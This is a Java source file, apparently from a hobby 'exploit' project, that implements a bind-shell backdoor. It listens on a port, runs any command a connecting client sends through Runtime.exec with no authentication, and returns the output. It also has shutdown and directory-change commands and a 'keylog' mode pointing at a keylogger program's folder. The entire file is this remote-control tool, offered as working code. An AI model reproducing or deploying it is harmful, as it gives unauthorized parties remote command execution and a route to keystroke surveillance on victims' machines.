import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Enumeration;

class Terminal {
    private static Socket clientSo;
    private static ServerSocket server;
    private static Socket client;
    private static BufferedReader in;
    private static BufferedReader cmdAnswerReader;
    private static Process process;
    public static String BasisVerzeichnis = "/Users/cigerxwinchaker/Desktop/EigendeProjekte/java_Projekt_Exploit/";

    public InputStream exec(String command) throws InterruptedException, IOException {
        process = null;
        process = Runtime.getRuntime().exec(command, null, new File(BasisVerzeichnis));
        return process.getInputStream();
    }

    public static void handleRequest() throws IOException, InterruptedException {
        clientSo = server.accept();
        Terminal terminal= new Terminal();
        BufferedReader clientInput = new BufferedReader(new InputStreamReader(clientSo.getInputStream()));
        PrintWriter clientOutput = new PrintWriter(clientSo.getOutputStream(), true);
        clientOutput.println("...reached CMD...");
        String cmdAnswerLine = null;

        while (!clientSo.isClosed()) {
            clientOutput.println("Befehl > ");
            String clientRequest = clientInput.readLine();
            if (clientRequest.equals("exit")) {
                clientOutput.println("All Systems shutdown... ");
                server.close();
                System.exit(0);
            } else if (clientRequest.equals("leave")) {
                clientSo.close();
            } else if(clientRequest.equals("ch")) {
                clientOutput.println("new Basedirectory > ");
                String clientRequest1 = clientInput.readLine();
                terminal.BasisVerzeichnis = clientRequest1;
                clientOutput.println("new Basedirectory =  " + terminal.BasisVerzeichnis);
            } else if(clientRequest.equals("keylog")) {
              //change Basedirectory to keylogger programm directory
              terminal.BasisVerzeichnis = "/Users/cigerxwinchaker/Desktop/EigendeProjekte/java_Projekt_Exploit";
              clientOutput.println("new Basedirectory =  " + terminal.BasisVerzeichnis);
            } else {
                cmdAnswerReader = new BufferedReader(new InputStreamReader(terminal.exec(clientRequest)));
                while ((cmdAnswerLine = cmdAnswerReader.readLine()) != null && !clientSo.isClosed()) {
                    clientOutput.println(cmdAnswerLine);
                }
            }
            clientOutput.println("\n !!! Request executed !!!\n");
        }
    }

    public static void main(String [] args) {
      if(args.length > 0){
        //TODO !!! wenn client abbricht dann fällt programm aus
        try {
            server = new ServerSocket(Integer.valueOf(args[0]));
//            sendInformations();
//            sendInformations();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        while (true) {
            System.out.println("Server started, waiting for client"); // nur für tests
            try {
                handleRequest();
            } catch (IOException | InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

  } else {
    System.err.println("MISSING PORT Argument.");
  }
}
}
